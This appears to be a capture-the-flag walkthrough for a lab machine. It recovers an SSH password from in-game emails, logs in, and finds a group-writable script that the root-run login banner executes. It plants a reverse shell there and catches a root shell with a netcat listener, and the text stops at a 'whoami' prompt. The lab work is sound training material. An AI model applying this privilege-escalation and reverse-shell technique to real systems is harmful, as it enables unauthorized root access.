Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.

### Looking through her emails, what was a temporary password set for her?
- **Answer:** S1ck3nBluff+secureshell

---

## SSH

### In the email, who send it? Using the password from the previous question and the senders username, connect to the machine using SSH.
- **SSH Credentials:** baksteen:S1ck3nBluff+secureshell


### Once connected, what groups does this user belong to? Are there any interesting files that can be run by that group?
- **Answer:** cube.sh
- **Steps to Reproduce:** 

```bash
baksteen@fowsniff:~$ find  / -group users 2>/dev/null
/opt/cube/cube.sh
/run/user/1004
/run/user/1004/systemd
/run/user/1004/systemd/private
/run/user/1004/systemd/notify
/home/baksteen/.cache
/home/baksteen/.cache/motd.legal-displayed
/home/baksteen/Maildir
/home/baksteen/Maildir/tmp
/home/baksteen/Maildir/dovecot-uidvalidity
/home/baksteen/Maildir/dovecot.index.log

## Root Access

- The `cube.sh` is run when the shell opens up as root!
- We can put a reverse shell in  `cube.sh` to get root access!

```bash
baksteen@fowsniff:~$ cat /etc/update-motd.d/00-header 
#!/bin/sh
#

#fi

#printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"

sh /opt/cube/cube.sh
```


- On reconnecting using ssh, we can get a root shell using netcat:

```bash
$ nc -lvnp 1234
listening on [any] 1234 ...

connect to [10.17.7.91] from (UNKNOWN) [10.10.34.85] 40414
/bin/sh: 0: can't access tty; job control turned off

# whoami
